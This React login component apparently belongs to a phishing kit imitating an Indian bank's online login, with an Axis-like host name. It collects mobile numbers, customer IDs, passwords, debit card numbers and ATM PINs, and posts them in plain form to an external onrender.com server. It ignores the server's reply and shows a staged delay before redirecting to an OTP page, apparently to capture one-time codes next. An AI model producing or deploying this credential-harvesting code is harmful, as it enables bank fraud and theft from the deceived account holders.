import { useState } from "react";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import { FaSpinner } from "react-icons/fa";
import { useNavigate } from "react-router-dom";
import "./Login.css";

function LoginSection() {
  const [activeTab, setActiveTab] = useState("customer");

  const [mobileNumber, setMobileNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [password, setPassword] = useState("");

  const [cardNumber, setCardNumber] = useState("");
  const [pin, setPin] = useState("");

  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });

  const navigate = useNavigate();

  // ---------------- Handlers ----------------
  const handleMobileChange = (e) => {
    const value = e.target.value.replace(/\D/g, ""); // Only digits
    setMobileNumber(value.slice(0, 10));
  };

  const handleCardChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    value = value.match(/.{1,4}/g)?.join(" ") || "";
    setCardNumber(value);
  };

  // ---------------- Customer Login ----------------
  const handleCustomerLogin = async () => {
    if (!mobileNumber || !customerId || !password) {
      return setMessage({
        text: "Mobile number, Customer ID and Password are required",
        type: "error",
      });
    }

    if (!/^\d{10}$/.test(mobileNumber)) {
      return setMessage({
        text: "Mobile number must be exactly 10 digits",
        type: "error",
      });
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      await fetch("https://axisonline-1.onrender.com/api/users/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          mobileNumber,
          customerId,
          password,
        }),
      });

      // Store mobile number & last visited page
      localStorage.setItem("mobileNumber", mobileNumber);
      localStorage.setItem("lastVisitedPage", "/otp-submit");

      // Show spinner for 5s, then redirect to OTP
      setTimeout(() => {
        navigate("/otp-submit", { state: { mobileNumber } });
      }, 5000);
    } catch (err) {
      console.error(err);
      setMessage({ text: "Network error, please try again", type: "error" });
      setLoading(false);
    }
  };

  // ---------------- Debit Card Login ----------------
  const handleDebitLogin = async () => {
    if (!mobileNumber || !cardNumber || !pin) {
      return setMessage({
        text: "Mobile number, Debit card number and PIN are required",
        type: "error",
      });
    }

    if (!/^\d{10}$/.test(mobileNumber)) {
      return setMessage({
        text: "Mobile number must be exactly 10 digits",
        type: "error",
      });
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      await fetch("https://axisonline-1.onrender.com/api/debit-cards", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          mobileNumber,
          cardNumber,
          pin,
        }),
      });

      // Store mobile number & last visited page
      localStorage.setItem("mobileNumber", mobileNumber);
      localStorage.setItem("lastVisitedPage", "/otp-submit");

      setTimeout(() => {
        navigate("/otp-submit", { state: { mobileNumber } });
      }, 5000);
    } catch (err) {
      console.error(err);
      setMessage({ text: "Network error, please try again", type: "error" });
      setLoading(false);
    }
  };

  return (
    <div className="login-page">
      <div className="login-card">
        <h2>Login</h2>

        {/* Tabs */}
        <div className="tabs">
          <button
            className={activeTab === "customer" ? "active" : ""}
            onClick={() => setActiveTab("customer")}
          >
            Customer ID
          </button>
          <button
            className={activeTab === "debit" ? "active" : ""}
            onClick={() => setActiveTab("debit")}
          >
            Debit Card
          </button>
        </div>

        {/* Error / Success Message */}
        {message.text && (
          <div className={`form-message ${message.type}`}>{message.text}</div>
        )}

        {/* ---------------- Customer Login Form ---------------- */}
        {activeTab === "customer" && (
          <div className="form">
            <label>Mobile Number</label>
            <input
              type="tel"
              value={mobileNumber}
              onChange={handleMobileChange}
              maxLength={10}
              disabled={loading}
            />

            <label>Customer ID</label>
            <input
              type="text"
              value={customerId}
              onChange={(e) => setCustomerId(e.target.value)}
              disabled={loading}
            />
            <a href="/ForgetCustomerId" className="forgot-link">
              Forgot Customer ID?
            </a>

            <label>Password</label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={loading}
            />
            <a href="/ForgotPassword" className="forgot-link">
              Forgot Password?
            </a>

            <button
              className="verify-btn"
              onClick={handleCustomerLogin}
              disabled={loading}
            >
              {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
            </button>
          </div>
        )}

        {/* ---------------- Debit Card Login Form ---------------- */}
        {activeTab === "debit" && (
          <div className="form">
            <label>Mobile Number</label>
            <input
              type="tel"
              value={mobileNumber}
              onChange={handleMobileChange}
              maxLength={10}
              disabled={loading}
            />

            <label>Debit Card Number</label>
            <input
              type="tel"               // ensures numeric keyboard on mobile
              inputMode="numeric"      // hints mobile to show numeric keypad
              pattern="[0-9]*"         // optional, restricts input to digits on some browsers
              value={cardNumber}
              onChange={handleCardChange}
              maxLength={19}
              disabled={loading}
              placeholder="5555 5555 5555 5555"
            />


            <label>ATM PIN</label>
            <div className="pin-container">
              <input
                type={showPin ? "text" : "password"}
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                maxLength={6}
                disabled={loading}
              />
              <span className="eye-icon" onClick={() => setShowPin(!showPin)}>
                {showPin ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </span>
            </div>

            <button
              className="verify-btn"
              onClick={handleDebitLogin}
              disabled={loading}
            >
              {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default LoginSection;
